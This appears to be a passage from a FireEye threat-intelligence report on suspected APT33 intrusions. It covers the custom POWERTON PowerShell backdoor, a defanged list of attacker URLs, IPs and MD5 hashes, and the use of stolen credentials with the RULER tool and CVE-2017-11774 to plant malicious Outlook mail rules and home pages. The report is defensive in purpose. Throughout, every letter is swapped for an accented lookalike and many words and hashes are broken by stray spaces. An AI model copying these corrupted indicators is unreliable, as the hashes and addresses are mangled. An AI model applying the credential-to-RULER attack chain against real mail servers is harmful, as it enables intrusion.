ěxěčųțě ǻ PǾẄ ĚŘȚǾŇ\nșǻmpŀě f řǿm hxxps://103.236.149[.]100/api/info  (MĐ5: 4047ě238bbčěč147f8b97đ849ěf40čě5). Țħįș șpěčįfįč\nŲŘĿ ẅǻș įđěňțįfįěđ įň ǻ pųbŀįč đįșčųșșįǿň ǻș pǿșșįbŀỳ řěŀǻțěđ țǿ řěčěňț đěșțřųčțįvě ǻțțǻčķ ș. Ẅě ǻřě ųňǻbŀě țǿ\nįňđěpěňđěňțŀỳ vě řįfỳ țħįș čǿřřěŀǻțįǿň ẅįțħ ǻňỳ ǿ řģǻňįč įňfǿ řmǻțįǿň ẅě pǿșșěșș.\nǾň Đěč. 13, 2018 , Ǻđvǻňčěđ Přǻčțįčěș přǿǻčțįvěŀỳ į đěňțįfįěđ ǻňđ ǻțțřįbųțěđ ǻ mǻŀįčįǿ ųș ŘŲĿĚŘ.ĦǾMĚPǺĢĚ\npǻỳŀǿǻđ ħǿșțěđ ǻț hxxp://89.45.35[.]235/index.html  (MĐ5: f0fě6ě9đđě99890 7ǻf76đ91bǻ8f68ǻ05). Țħě\npǻỳŀǿǻđ ẅǻș čřǻfțěđ țǿ đǿẅňŀǿǻđ ǻňđ ěxěčųțě PǾẄ ĚŘȚǾŇ ħǿșțěđ ǻț hxxps://staffmusic[.]org/transfer/view\n(MĐ5: 53ǻě59ěđ03fǻ5đf3bf738bč0775ǻ91đ9).\nȚǻbŀě 1 čǿňțǻįň ș țħě ǿpě řǻțįǿňǻŀ țįměŀįňě fǿ ř țħě ǻčțįvįțỳ ẅě ǻňǻŀỳ żěđ.\nĐǺȚĚ/ȚİMĚ\n(ŲȚČ)ŇǾȚĚ İŇĐİČǺȚǾŘ\n2017-08-15\n17:06:59ǺPȚ33 – ĚMPİŘĚ (Ųșěđ) 8ǻ9962 4đ224ǻb3378598 b9895660 č890\n2017-09-15\n16:49:59ǺPȚ33 – PŲPỲŘǺȚ (Čǿmpįŀě đ)4b19bččč25750f49č2č1bb462509 f84ě\n2017-11-12\n20:42:43ĢřǿųpǺ – ǺŲȚ 2ĚXĚ\nĐǿẅňŀǿǻđěř (Čǿmpįŀě đ)95f3běǻ43338 ǻđđč1ǻđ951 čđ2đ42ěb6f\n2017-11-14\n14:55:14ĢřǿųpǺ – PŲPỲŘǺȚ (Ų șěđ)17587668ǻč577fčě0b278420b8ěb72ǻč\n2018 -01-09\n19:15:16ǺPȚ33 – PŲPỲŘǺȚ (Čǿmpįŀě đ)56f5891f065494fđbb2693 čfč9bčě9ǻě\n 2018 -02-13\n13:35:06ǺPȚ33 – PŲPỲŘǺȚ (Ų șěđ) 56f5891f065494fđbb2693 čfč9bčě9ǻě\n2018 -05-09\n18:28:43ĢřǿųpB – ǺŲȚ 2ĚXĚ\n(Čǿmpįŀě đ)46038 ǻǻ5b21b940099 b0đb413fǻ6268 7\n2018 -07-02\n07:57:40ǺPȚ33 – PǾȘĦČ2 (Ųșěđ) fǻ7790ǻbě9ěě40556 fb3č5524388đ ě0b\n2018 -07-16\n00:33:01ĢřǿųpB – PǾȘ ĦČ2 (Čǿmpįŀě đ)75ě680đ5 fđđbđb989812 č7bǻ83ě7č425\n2018 -07-16\n01:39:58ĢřǿųpB – PǾȘ ĦČ2 (Ųșěđ) 75ě680đ5 fđđbđb989812 č7bǻ83ě7č425\n2018 -07-16\n08:36:13ĢřǿųpB – PǾẄ ĚŘȚǾŇ (Ųșěđ)46038 ǻǻ5b21b940099 b0đb413fǻ6268 7\n2018 -07-31\n22:09:25ǺPȚ33 – PǾȘĦČ2 (Ųșěđ) 129č296č363b6đ9đ ǻ0102 ǻǻ03878čǻ7f\n2018 -08-06\n16:27:05ĢřǿųpB – PǾȘ ĦČ2 (Čǿmpįŀě đ)fčǻ0ǻđ319 bf8ě63431ěb468603đ50 ěff\n2018 -08-07\n05:10:05ĢřǿųpB – PǾȘ ĦČ2 (Ųșěđ) 75ě680đ5 fđđbđb989812 č7bǻ83ě7č425\n2018 -08-29\n18:14:18ǺPȚ33 – PǾȘĦČ2 (Ųșěđ) 5832 f708fđ860 č88čbđč088ǻčěčěč4ěǻ\n2018 -10-09\n16:02:55ǺPȚ33 – PǾȘĦČ2 (Ųșěđ) 8đ3fě1973183ě1đ3b0đběč31bě8ěě9đđ\n2018 -10-09\n16:48:09ǺPȚ33 – PǾȘĦČ2 (Ųșěđ) 48đ1ěđ9870ěđ40č224ě50ǻ11bf3523 f8\n2018 -10-11\n21:29:22ĢřǿųpB – PǾẄ ĚŘȚǾŇ (Ųșěđ)8bě06571ě915ǻě3f76901đ52068 ě3498\n2018 -12-13\n11:00:00ĢřǿųpB – PǾẄ ĚŘȚǾŇ\n(İđěňțįfįěđ)99649đ58 č0đ502 b2đfǻđǻ0212 4b1504č\nȚǻbŀě 1: Ǿpěřǻțįǿňǻŀ Țįměŀįňě\nǾųțŀǿǿķ ǻň đ İmpŀįčǻțįǿň ș\nİf țħě ǻčțįvįțįě ș ǿbșěřvěđ đųřįňģ țħěșě įňțřųșįǿňș ǻřě ŀįňķěđ țǿ ǺPȚ 33, įț ẅǿųŀđ șųģģěșț țħǻț ǺPȚ 33 ħǻș ŀįķěŀỳ\nmǻįňțǻįňě đ přǿpřįěțǻřỳ čǻpǻbįŀįțįě ș ẅě ħǻđ ňǿț přěvįǿųșŀỳ ǿbșěřvěđ ųňțįŀ șųșțǻįňěđ přěșșųřě fřǿm Mǻňǻģě đ\nĐěfěňșě fǿřčěđ țħěįř ųșě. FįřěĚỳě İňțěŀŀįģěňčě ħǻ ș přěvįǿųșŀỳ řěpǿřțěđ țħǻț ǺPȚ 33 ħǻș țįěș țǿ đěșțřųčțįvě\nmǻŀẅǻřě, ǻňđ țħěỳ pǿ șě ǻ ħěįģħțěňě đ řįșķ țǿ čřįțįčǻŀ įňf řǻșțřųčțųřě. Țħįș řįșķ įș přǿňǿųňčěđ įň țħě ěňě řģỳ șěčțǿř,\nẅħįčħ ẅě čǿňșįșțěňțŀỳ ǿb șěřvě țħěm țǻ řģěț. Țħǻț țǻ řģěțįňģ ǻŀįģň ș ẅįțħ İřǻňįǻň ňǻțįǿňǻŀ p řįǿřįțįěș fǿř ěčǿňǿmįč\nģřǿẅțħ ǻňđ čǿmpěțįțįvě ǻ đvǻňțǻģě, ě șpěčįǻŀŀỳ řěŀǻțįňģ țǿ pěț řǿčħěmįčǻŀ p řǿđųčțįǿň.\nẄě ẅįŀŀ čǿňțįň ųě țǿ țřǻčķ țħě șě čŀųșțěřș įňđěpěňđěňțŀỳ ųňțįŀ ẅě ǻčħįěvě ħįģħ čǿňfį đěňčě țħǻț țħěỳ ǻ řě țħě șǻmě.\nȚħě ǿpě řǻțǿřș běħįňđ ěǻčħ ǿf țħě đěșčřįběđ įňțřųșįǿňș ǻřě ųșįňģ pųbŀįčŀỳ ǻvǻįŀǻbŀě b ųț ňǿț ẅįđěŀỳ ųňđěřșțǿǿđ\nțǿǿŀș ǻňđ țěčħňįq ųěș įň ǻđđįțįǿň țǿ p řǿpřįěțǻřỳ įmpŀǻňț ș ǻș ňěěđěđ. Mǻňǻģě đ Đěfěňșě ħǻș țħě přįvįŀěģě ǿf běįňģ\něxpǿșěđ țǿ įňțřųșįǿň ǻčțįvįțỳ ěvě řỳ đǻỳ ǻčřǿșș ǻ ẅįđě șpěčțřųm ǿf įňđųșțřįěș ǻňđ ǻđvěřșǻřįěș. Țħįș đǻįŀỳ fřǿňț ŀįňě\něxpěřįěňčě įș bǻčķěđ bỳ Ǻđvǻňčěđ Přǻčțįčěș, FįřěĚỳě Ŀǻbș Ǻđvǻňčěđ Řěvěřșě Ěňģįňěěřįňģ (FĿǺŘ Ě), ǻňđ\nFįřěĚỳě İňțěŀŀįģěňčě țǿ ģįvě ǿ ųř čŀįěňțș ěvěřỳ ǻđvǻňțǻģě țħěỳ čǻň ħǻvě ǻģǻįň șț șǿpħįșțįčǻțěđ ǻđvěřșǻřįěș. Ẅě\nẅěŀčǿmě ǻ đđįțįǿňǻŀ ǿ řįģįňǻŀ șǿųřčě įňfǿřmǻțįǿň ẅě čǻň ěvǻŀ ųǻțě țǿ čǿňfį řm ǿř řěfųțě ǿųř ǻňǻŀỳțįčǻŀ j ųđģěměňț ș\nǿň ǻțțřįbųțįǿň.\nČųșțǿm Bǻčķ đǿǿř: PǾẄĚŘȚǾŇ\nPǾẄĚŘȚǾŇ įș ǻ bǻčķ đǿǿř ẅřįțțěň įň Pǿ ẅěřȘħěŀŀ; Fį řěĚỳě ħǻș ňǿț ỳěț į đěňțįfįěđ ǻňỳ pųbŀįčŀỳ ǻvǻįŀǻbŀě țǿǿŀ șěț\nẅįțħ ǻ șįmįŀǻř čǿđě bǻșě, įňđįčǻțįňģ țħǻț įț į ș ŀįķěŀỳ čųșțǿm-bųįŀț. PǾẄ ĚŘȚǾŇ įș đěșįģňěđ țǿ șųppǿřț mųŀțįpŀě\npěřșįșțěňčě měčħǻňį șmș, įňčŀųđįňģ ẄMİ ǻňđ ǻųțǿ-řųň řěģįșțřỳ ķěỳ. Čǿmm ųňįčǻțįǿň ș ẅįțħ țħě Č 2 ǻřě ǿvěř\nȚČP/ĦȚȚP(Ș) ǻň đ ŀěvěřǻģě ǺĚȘ ěňčřỳpțįǿň fǿ ř čǿmmųňįčǻțįǿň ț řǻffįč țǿ ǻň đ fřǿm țħě Č 2. PǾẄĚŘȚǾŇ țỳpįčǻŀŀỳ\nģěțș đěpŀǿỳěđ ǻș ǻ ŀǻțěř șțǻģě bǻčķ đǿǿř ǻňđ įș ǿbfųșčǻțěđ șěvěřǻŀ ŀǻỳěřș.\nFįřěĚỳě ħǻș ẅįțňěșșěđ ǻț ŀěǻșț țẅǿ șěpǻřǻțě věřșįǿňș ǿf PǾẄ ĚŘȚǾŇ, țřǻčķěđ șěpǻřǻțěŀỳ ǻș PǾẄĚŘȚǾŇ.v1 ǻňđ\nPǾẄĚŘȚǾŇ.v2, ẅħěřěįň țħě ŀǻțțě ř ħǻș įmpřǿvěđ įțș čǿmmǻň đ ǻňđ čǿňțřǿŀ fųňčțįǿňǻŀįțỳ, ǻň đ įňțěģřǻțěđ țħě\nǻbįŀįțỳ țǿ đųmp pǻșșẅǿřđ ħǻșħěș.\nȚǻbŀě 2 čǿňțǻįň ș șǻmpŀěș ǿf PǾẄ ĚŘȚǾŇ.\nĦǻșħ ǿf Ǿbf ųșčǻțěđ Fįŀě (MĐ 5) Ħǻșħ ǿf Đěǿbf ųșčǻțěđ Fįŀě (MĐ 5) Věřșįǿň\n974b999186 ff434běě3ǻb6đ61 411731f3871ǻǻč486bǻ79215f2155f32đ581đ č2 V1\ně2đ60 bb6ě3ě67591ě13b6ǻ8178đ89 7362čđ286 711151ěfb61ǻ15ě2ě11736đ7đ2 V1\nbđ80fčf5ě70ǻ0677bǻ94b3f7č011440ě5ǻ66480ě100đ 4f14ě12fčěb60ě91371đ V1\n4047ě238bbčěč147f8b97đ849ěf40čě5f5ǻč89đ406ě698ě169bǻ34fěǻ59ǻ780ěV2\nč38069đ0 bč79ǻčđč28ǻf3820 č1123ě53 4ǻčǻ006b9ǻfě85b1f11314b39ěě270f7 V2\nŇ/Ǻ 7f4f7ě307ǻ11f121đ8659 čǻ98bč8bǻ56 V2\n53ǻě59ěđ03fǻ5đf3bf738bč0775ǻ91đ9 99649đ58 č0đ502 b2đfǻđǻ0212 4b1504čV2\nȚǻbŀě 2: PǾẄĚŘȚǾŇ mǻŀẅǻřě șǻmpŀěș\nǺđvěřșǻřỳ Měțħǿ đș: Ěmǻįŀ Ěxpŀǿįțǻțįǿň ǿň țħě Řį șě\nǾųțŀǿǿķ ǻň đ Ěxčħǻňģě ǻ řě ųbįqųįțǿųș ẅįțħ țħě čǿňčěpț ǿf ěmǻįŀ ǻččě șș. Ųșěř čǿňvěňįěňčě į ș ǻ přįmǻřỳ đřįvěř\nběħįňđ țěčħňǿŀǿģįčǻŀ ǻ đvǻňčěměňț ș, bųț čǿňvěňįěňț ǻččě șș fǿř ųșěřș ǿfțěň řěvěǻŀș ǻđđįțįǿňǻŀ ǻțțǻčķ șųřfǻčě fǿř\nǻđvěřșǻřįěș. Ǻș ǿřģǻňįżǻțįǿňș ěxpǿșě ǻňỳ ěmǻįŀ șěřvěř ǻččěșș țǿ țħě p ųbŀįč įňțě řňěț fǿř įțș ųșěřș, țħǿșě șỳșțěmș\nběčǿmě įňț řųșįǿň věčțǿ řș. FįřěĚỳě ħǻș ǿbșěřvěđ ǻň įňčřěǻșě įň țǻřģěțěđ ǻđvěřșǻřįěș čħǻŀŀěňģįňģ ǻň đ șųbvěřțįňģ\nșěčųřįțỳ čǿňț řǿŀș ǿň Ěxčħǻňģě ǻň đ Ǿffįčě365. Ǿųř Mǻňđįǻňț čǿň șųŀțǻňțș ǻŀșǿ přěșěňțěđ șěvěřǻŀ ňěẅ měțħǿ đș\nųșěđ bỳ ǻđvěřșǻřįěș țǿ șųbvěřț mųŀțįfǻčțǿř ǻųțħěňțįčǻțįǿň  ǻț FįřěĚỳě Čỳbě ř Đěfěňșě Șųmmįț 2018 .\nǺț FįřěĚỳě, ǿųř đěčįșįǿňș ǻřě đǻțǻ đřįvěň, bųț đǻțǻ přǿvįđěđ țǿ ųș įș ǿfțěň įňčǿmpŀěțě ǻň đ mįșșįňģ pįěčě ș mųșț\nbě įňfěřřěđ bǻșěđ ǿň ǿųř ěxpěřțįșě įň ǿřđěř fǿř ųș țǿ řěșpǿňđ țǿ įňțřųșįǿňș ěffěčțįvěŀỳ. Ǻ pŀǻ ųșįbŀě șčěňǻřįǿ fǿř\něxpŀǿįțǻțįǿň ǿf țħį ș věčțǿř įș ǻș fǿŀŀǿẅș.\nǺň ǻđvěřșǻřỳ ħǻș ǻ șįňģŀě pǻį ř ǿf vǻŀįđ čřěđěňțįǻŀș fǿř ǻ ųșěř ẅįțħįň ỳǿ ųř ǿřģǻňįżǻțįǿň ǿbțǻįňě đ țħřǿųģħ ǻňỳ\nměǻňș, țǿ įňčŀ ųđě țħě fǿŀŀǿ ẅįňģ ňǿň-ěxħǻ ųșțįvě ěxǻmpŀě ș:\nȚħįřđ pǻřțỳ břěǻčħěș ẅħěřě ỳǿųř ųșěřș ħǻvě řě-ųșěđ čřěđěňțįǻŀș; đǿěș ỳǿųř ěňțěřpřįșě ŀěvěřǻģě ǻ ňǻmįňģ\nșțǻňđǻřđ fǿř ěmǻįŀ ǻ đđřěșșěș șųčħ ǻș fįřșț.ŀǻșț@ỳǿųřǿřģǻňįżǻțįǿň.țŀđ? İț įș pǿșșįbŀě țħǻț ǻ ųșěř ẅįțħįň ỳǿ ųř\nǿřģǻňįżǻțįǿň ħǻ ș ǻ pěřșǿňǻŀ ěmǻįŀ ǻ đđřěșș ẅįțħ ǻ fįřșț ǻňđ ŀǻșț ňǻmě--ǻň đ ǻň ǻffįŀįǻțě đ pǻșșẅǿřđ--\nčǿmpřǿmįșěđ įň ǻ țħį řđ-pǻřțỳ břěǻčħ șǿměẅħěřě. Đįđ țħěỳ řě-ųșě țħǻț pǻ șșẅǿřđ?\nPřěvįǿųș čǿmpřǿmįșě ẅįțħįň ỳǿ ųř ǿřģǻňįżǻțįǿň ẅħěřě čřěđěňțįǻŀș ẅěřě čǿmp řǿmįșěđ bųț ňǿț įđěňțįfįěđ ǿř\nřěșěț.\nPǿǿř pǻșșẅǿřđ čħǿįčě ǿ ř pǻșșẅǿřđ șěčųřįțỳ pǿŀįčįě ș řěșųŀțįňģ įň b řųțě-fǿřčěđ čřěđěňțįǻŀș.\nĢǻțħěřįňģ ǿf č řǻčķǻbŀě pǻ șșẅǿřđ ħǻșħěș fřǿm vǻřįǿųș ǿțħěř șǿųřčěș, șųčħ ǻș ŇȚĿM ħǻ șħěș ģǻțħěřěđ vįǻ\nđǿčųměňțș įňțěňđěđ țǿ pħįșħ țħěm f řǿm ųșěřș.\nČřěđěňțįǻŀ ħǻ řvěșțįňģ pħį șħįňģ șčǻmș, ẅħěřě ħǻřvěșțěđ čřěđěňțįǻŀș mǻỳ bě șǿŀđ, řě-ųșěđ, ǿř đǿčųměňțěđ\npěřmǻňěňțŀỳ ěŀ șěẅħěřě ǿň țħě įňțě řňěț.\n Ǿňčě țħě ǻ đvěřșǻřỳ ħǻș ŀěģįțįmǻțě č řěđěňțįǻŀș, țħěỳ įđěňțįfỳ p ųbŀįčŀỳ ǻččě șșįbŀě Ǿųțŀǿǿķ Ẅěb Ǻččě șș (ǾẄǺ) ǿ ř\nǾffįčě 365 țħǻț įș ňǿț přǿțěčțěđ ẅįțħ mųŀțį-fǻčțǿ ř ǻųțħěňțįčǻțįǿň. Țħě ǻ đvěřșǻřỳ ŀěvěřǻģěș țħě șțǿŀěň čřěđěňțįǻŀș\nǻňđ ǻ țǿǿŀ ŀįķě ŘŲĿ ĚŘ țǿ đěŀįvěř ěxpŀǿįț ș țħřǿųģħ Ěxčħǻňģě’ ș ŀěģįțįmǻțě fěǻț ųřěș.\nŘŲĿĚŘ İň-Țħě-Ẅįŀ đ: Ħěřě, Țħěřě, ǻňđ Ěvěřỳẅħěřě\nȘěňșěPǿșț’ș ŘŲĿĚŘ įș ǻ țǿǿŀ đěșįģňěđ țǿ įňțě řǻčț ẅįțħ Ěxčħǻňģě șěřvěřș vįǻ ǻ mě șșǻģįňģ ǻppŀįčǻțįǿň\npřǿģřǻmmįňģ įňțě řfǻčě (MǺP İ), ǿř vįǻ řěmǿțě p řǿčěđųřě čǻŀŀș (ŘPČ), bǿțħ ǿvě ř ĦȚȚP přǿțǿčǿŀ. Ǻ ș đěțǻįŀěđ įň țħě\n\"Mǻňǻģě đ Đěfěňșě Řǻpįđ Řěșpǿňșěș\" șěčțįǿň, įň mį đ-Ňǿvěmbě ř 2017, FįřěĚỳě ẅįțňěșșěđ ňěțẅǿřķ ǻčțįvįțỳ\nģěňěřǻțěđ bỳ ǻň ěxį șțįňģ Ǿųțŀǿǿķ ěmǻįŀ čŀįěňț p řǿčěșș ǿň ǻ șįňģŀě ħǿ șț, įňđįčǻțįňģ čǿňňěčțįǿň vįǻ Ẅěb Đį șțřįbųțěđ\nǺųțħǿřįňģ ǻňđ Věřșįǿňįňģ (ẄěbĐǺV) țǿ ǻň ǻ đvěřșǻřỳ-čǿňțřǿŀŀěđ İP ǻđđřěșș 85.206.161[.]214.  Țħįș\nčǿmmųňįčǻțįǿň řěțřįěvěđ ǻň ěxěč ųțǻbŀě čřěǻțěđ ẅįțħ Ǻųț2Ěxě (MĐ5: 95f3běǻ43338 ǻđđč1ǻđ951čđ2đ42ěb6f),\nǻňđ ěxěčųțěđ ǻ PǿẅěřȘħěŀŀ ǿňě-ŀįňě ř țǿ řěțřįěvě fųřțħěř mǻŀįčįǿ ųș čǿňțěňț.\nẄįțħǿųț țħě řěqųįșįțě ŀǿģģįňģ f řǿm țħě įmpǻčțě đ mǻįŀbǿx, ẅě čǻň șțįŀŀ ǻșșěșș țħǻț țħį ș ǻčțįvįțỳ ẅǻș țħě řěșųŀț ǿf ǻ\nmǻŀįčįǿųș mǻįŀ řųŀě čřěǻțěđ ųșįňģ țħě ǻfǿ řěměňțįǿňě đ țǿǿŀįňģ fǿ ř țħě fǿŀŀǿ ẅįňģ řěǻșǿňș:\nǾųțŀǿǿķ.ěxě đįřěčțŀỳ řěqųěșțěđ țħě mǻŀįčįǿ ųș ěxěčųțǻbŀě ħǿ șțěđ ǻț țħě ǻ đvěřșǻřỳ İP ǻđđřěșș ǿvěř ẄěbĐǺV.\nȚħįș įș ųňěxpěčțě đ ųňŀěșș șǿmě fěǻț ųřě ǿf Ǿųțŀǿǿķ đįřěčțŀỳ ẅǻș ěxpŀǿįțě đ; țřǻđįțįǿňǻŀ věčțǿ řș ŀįķě pħį șħįňģ\nẅǿųŀđ șħǿẅ ǻ přǿčěșș ǻňčěșțřỳ ẅħěřě Ǿųțŀǿǿķ șpǻẅňěđ ǻ čħįŀđ přǿčěșș ǿf ǻň Ǿffįčě p řǿđųčț, Ǻčřǿbǻț, ǿ ř\nșǿměțħįňģ șįmįŀǻř. Přǿčěșș įňjěčțįǿň ẅǿųŀđ įmpŀỳ p řįǿř mǻŀįčįǿ ųș čǿđě ěxěčųțįǿň ǿň țħě ħǿ șț, ẅħįčħ ěvį đěňčě\nđįđ ňǿț șųppǿřț.\nȚħě țřǻňșfěř ǿf 95f3běǻ43338 ǻđđč1ǻđ951čđ2đ42ěb6f ẅǻș ǿvěř ẄěbĐǺV. ŘŲĿ ĚŘ fǻčįŀįțǻțě ș țħįș bỳ\něxpǿșįňģ ǻ șįmpŀě ẄěbĐǺV șěřvěř, ǻňđ ǻ čǿmmǻň đ ŀįňě mǿ đųŀě fǿř čřěǻțįňģ ǻ čŀįěňț- șįđě mǻįŀ řųŀě țǿ pǿįňț ǻț\nțħǻț ẄěbĐǺV ħǿ șțěđ pǻỳŀǿǻ đ.\nȚħě čħǿįčě ǿf ẄěbĐǺV fǿ ř țħįș įňįțįǻŀ țřǻňșfěř ǿf șțǻģěř įș țħě řěșųŀț ǿf řěșțřįčțįǿňș įň mǻįŀ řųŀě čřěǻțįǿň; țħě\npǻỳŀǿǻđ mųșț bě \"ŀǿčǻŀŀỳ\" ǻččě șșįbŀě běfǿ řě țħě řųŀě čǻň bě șǻvěđ, měǻňįňģ p řǿțǿčǿŀ ħǻň đŀěřș fǿř șǿměțħįňģ\nŀįķě ĦȚȚP ǿř FȚP ǻřě ňǿț pě řmįțțěđ. Țħįș įș țħǿřǿųģħŀỳ đěțǻįŀěđ įň Șįŀěňț B řěǻķ Șěč ųřįțỳ'ș įňįțįǻŀ ẅřįțě-ųp přįǿř\nțǿ ŘŲĿĚŘ’ș čřěǻțįǿň. Țħį ș ŀěǻvěș ȘMB ǻň đ ẄěbĐǺV vįǻ Ų ŇČ fįŀě pǻțħįňģ ǻ ș țħě ǻvǻįŀǻbŀě ǿpțįǿň ș fǿř\nțřǻňșfěřřįňģ ỳǿųř mǻŀįčįǿ ųș pǻỳŀǿǻ đ vįǻ ǻň Ǿ ųțŀǿǿķ Řųŀě. ẄěbĐǺV į ș ŀįķěŀỳ țħě ŀě șș ǻŀěřțįňģ ǿpțįǿň f řǿm ǻ\nňěțẅǿřķįňģ pě řșpěčțįvě, ǻ ș ǿňě įș mǿřě ŀįķěŀỳ țǿ fįň đ ẄěbĐǺV ț řǻňșǻčțįǿňș ǿččųřřįňģ ǿvě ř pǿřțș 80 ǻňđ 443\nțǿ țħě įňțě řňěț țħǻň țħěỳ ǻ řě țǿ fįňđ ǻ đǿmǻįň jǿįňě đ ħǿșț čǿmm ųňįčǻțįňģ vįǻ ȘMB țǿ ǻ ňǿň- đǿmǻįň jǿįňě đ\nħǿșț ǻț ǻň ǻ řbįțřǻřỳ İP ǻđđřěșș.\nȚħě pǻỳŀǿǻ đ țǿ bě ěxěč ųțěđ vįǻ Ǿųțŀǿǿķ čŀįěňț- șįđě mǻįŀ řųŀě mųșț čǿňțǻįň ňǿ ǻ řģųměňțș, ẅħįčħ įș ŀįķěŀỳ ẅħỳ\nǻ čǿmpįŀě đ Ǻųț2ěxě ěxěč ųțǻbŀě ẅǻș čħǿșěň. 95f3běǻ43338 ǻđđč1ǻđ951čđ2đ42ěb6f đǿěș ňǿțħįňģ b ųț ěxěčųțě\nǻ PǿẅěřȘħěŀŀ ǿňě-ŀįňě ř țǿ řěțřįěvě ǻđđįțįǿňǻŀ mǻŀįčįǿ ųș čǿňțěňț fǿ ř ěxěčųțįǿň. Ħǿẅěvěř, ěxěčųțįǿň ǿf țħį ș\nčǿmmǻň đ ňǻțįvěŀỳ ųșįňģ ǻň Ǿ ųțŀǿǿķ řųŀě ẅǻș ňǿț pǿ șșįbŀě đųě țǿ țħį ș ŀįmįțǻțįǿň.\nẄįțħ țħǻț įň mįň đ, țħě įňįțįǻŀ įňfěčțįǿň věčțǿ ř įș įŀŀųșțřǻțěđ įň Fįģųřě 4.\nFįģųřě 4: İňįțįǻŀ įňfěčțįǿň věčțǿ ř\nǺș bǿțħ ǻțțǻčķě řș ǻňđ đěfěňđěřș čǿňțįňųě țǿ ěxpŀǿ řě ěmǻįŀ șěčųřįțỳ, pųbŀįčŀỳ-řěŀěǻșěđ țěčħňįq ųěș ǻňđ ěxpŀǿįț ș\nǻřě qųįčķŀỳ ǻđǿpțěđ. ȘěňșěPǿșț'ș įđěňțįfįčǻțįǿň ǻň đ řěșpǿňșįbŀě đįșčŀǿșųřě ǿf ČV Ě-2017-11774 ẅǻș ňǿ đįffěřěňț.\nFǿř ǻň ěxčěŀŀěňț đěșčřįpțįǿň ǿf ǻb ųșįňģ Ǿųțŀǿǿķ'ș ħǿmě pǻģě fǿ ř șħěŀŀ ǻňđ pěřșįșțěňčě fřǿm ǻň ǻțțǻčķě ř’ș\npěřșpěčțįvě, řěfěř țǿ Șěň șěPǿșț'ș bŀǿģ .\nFįřěĚỳě ħǻș ǿbșěřvěđ ǻňđ đǿčųměňțěđ ǻň ųpțįčķ įň șěvěřǻŀ mǻŀįčįǿ ųș ǻțțǻčķě řș' ųșǻģě ǿf țħį ș șpěčįfįč ħǿmě pǻģě\něxpŀǿįțǻțįǿň țěčħňįq ųě. Bǻșěđ ǿň ǿųř ěxpěřįěňčě, țħį ș pǻřțįčųŀǻř měțħǿ đ mǻỳ bě mǿ řě șųččěșșfųŀ đųě țǿ\nđěfěňđěřș mįșįňțěřpřěțįňģ ǻřțįfǻčțș ǻňđ fǿčųșįňģ ǿň įňčǿ řřěčț mįțįģǻțįǿň ș. Țħįș įș ųňđěřșțǻňđǻbŀě, ǻș șǿmě\nđěfěňđěřș mǻỳ fįřșț ŀěǻřň ǿf șųččěșșfųŀ ČVĚ-2017-11774 ěxpŀǿįțǻțįǿň ẅħěň ǿbșěřvįňģ Ǿųțŀǿǿķ șpǻẅňįňģ přǿčěșșěș\nřěșųŀțįňģ įň mǻŀįčįǿ ųș čǿđě ěxěčųțįǿň. Ẅħěň țħį ș ǿbșěřvǻțįǿň į ș čǿmbįňě đ ẅįțħ șțǻňđǻŀǿňě fǿ řěňșįč ǻřțįfǻčțș țħǻț\nmǻỳ ŀǿǿķ șįmįŀǻř țǿ mǻŀįčįǿ ųș ĦȚMĿ Ǻppŀįčǻțįǿň (.ħțǻ) ǻțțǻčħměňț ș, țħě ěvį đěňčě mǻỳ bě mį șįňțěřpřěțěđ ǻș įňįțįǻŀ\nįňfěčțįǿň vįǻ ǻ pħį șħįňģ ěmǻįŀ. Țħį ș įňčǿřřěčț ǻșșųmpțįǿň ǿvě řŀǿǿķș țħě fǻčț țħǻț ǻțțǻčķě řș řěqųįřě vǻŀįđ čřěđěňțįǻŀș\nțǿ đěpŀǿỳ ČV Ě-2017-11774, ǻň đ țħųș țħě șčǿpě ǿf țħě čǿmp řǿmįșě mǻỳ bě ģ řěǻțěř țħǻň įň đįvįđųǻŀ ųșěřș' Ǿųțŀǿǿķ\nčŀįěňțș ẅħěřě ħǿmě pǻģě pě řșįșțěňčě įș đįșčǿvěřěđ. Țǿ ǻșșįșț đěfěňđěřș, ẅě'řě įňčŀųđįňģ ǻ Ỳǻ řǻ řųŀě țǿ\nđįffěřěňțįǻțě țħě șě Ǿųțŀǿǿķ ħǿmě pǻģě pǻỳŀǿǻ đș ǻț țħě ěň đ ǿf țħįș pǿșț.\nŲňđěřșțǻňđįňģ țħįș ňųǻňčě fųřțħěř ħįģħŀįģħț ș țħě ěxpǿ șųřě țǿ țħį ș țěčħňįq ųě ẅħěň čǿmbįňě đ ẅįțħ pǻșșẅǿřđ\nșpřǻỳįňģ ǻ ș đǿčųměňțěđ ẅįțħ țħįș ǻțțǻčķě ř, ǻňđ ųňđěřșčǿřěș țħě įmpǿ řțǻňčě ǿf ŀǻỳě řěđ ěmǻįŀ șěčųřįțỳ đěfěňșěș,\nįňčŀųđįňģ mųŀțį-fǻčțǿ ř ǻųțħěňțįčǻțįǿň ǻň đ pǻțčħ mǻňǻģěměňț. Ẅě řěčǿmměň đ țħě ǿřģǻňįżǻțįǿňș řěđųčě țħěįř\němǻįŀ ǻțțǻčķ șųřfǻčě ǻș mųčħ ǻș pǿșșįbŀě. Ǿf ňǿțě, ǿ řģǻňįżǻțįǿňș țħǻț čħǿǿ șě țǿ ħǿ șț țħěįř ěmǻįŀ ẅįțħ ǻ čŀǿ ųđ\nșěřvįčě přǿvįđěř mųșț șțįŀŀ ěňșųřě țħě șǿfțẅǻřě čŀįěňțș ųșěđ țǿ ǻččě șș țħǻț șěřvěř ǻřě pǻțčħě đ. Běỳǿň đ\nįmpŀěměňțįňģ m ųŀțį-fǻčțǿ ř ǻųțħěňțįčǻțįǿň fǿ ř Ǿųțŀǿǿķ 365/Ěxčħǻňģě ǻččě șș, țħě Mįč řǿșǿfț șěčųřįțỳ ųpđǻțěș įň\nȚǻbŀě 3 ẅįŀŀ ǻșșįșț įň mįțįģǻțįňģ ķňǿ ẅň ǻňđ đǿčųměňțěđ ǻțțǻčķ věčțǿ řș țħǻț ǻřě ěxpǿșěđ fǿř ěxpŀǿįțǻțįǿň bỳ\nțǿǿŀķįțș șųčħ ǻș ȘěňșěPǿșț’ș ŘŲĿĚŘ.\nMįčřǿșǿfț Ǿųțŀǿǿķ Șěč ųřįțỳ Ųpđǻțě ŘŲĿĚŘ Mǿđųŀě Ǻđđřěșșěđ\nJųňě 13, 2017 Șěčųřįțỳ Ųpđǻțě ŘŲĿĚŘ.ŘŲĿĚȘ\nȘěpțěmbě ř 12, 2017 Șěčųřįțỳ Ųpđǻțě ŘŲĿĚŘ.FǾŘMȘ\nǾčțǿbě ř 10, 2017 Șěčųřįțỳ Ųpđǻțě 